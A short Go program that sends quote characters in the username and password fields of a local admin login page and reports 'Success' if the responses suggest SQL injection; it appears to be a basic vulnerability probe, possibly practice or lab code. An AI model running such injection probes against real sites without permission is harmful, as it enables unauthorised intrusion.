package main

import (
		"fmt"
		"io/ioutil"
		"log"
		"net/http"
		"net/url"
)

type Database struct {
	banner string
	collected_data [] string
}

func get_response(data url.Values) (int, string) {
	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
	if (err != nil) {
		log.Fatal(err);
	}

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}
	
	return resp.StatusCode, string(body);	
}	

func check_sqli() bool {
	data := url.Values {
		"username":		{"''"},
		"password":		{"'"},
	};

	var good bool = false;

	var code int;
	var body string;
	code, body = get_response(data);

	if (code == 500) {
		good = true;
	}

	data = url.Values {
		"username":		{"''"},
		"password":		{"''"},
	};

	code, body = get_response(data);
	if (code == 200) {
		good = true;
	}

	if (good && (body != "")) {
		return true;
	}
	return false;
}

func main() {
	var vuln bool = check_sqli();

	if (vuln == true) {
		fmt.Println("Success");
	}
}
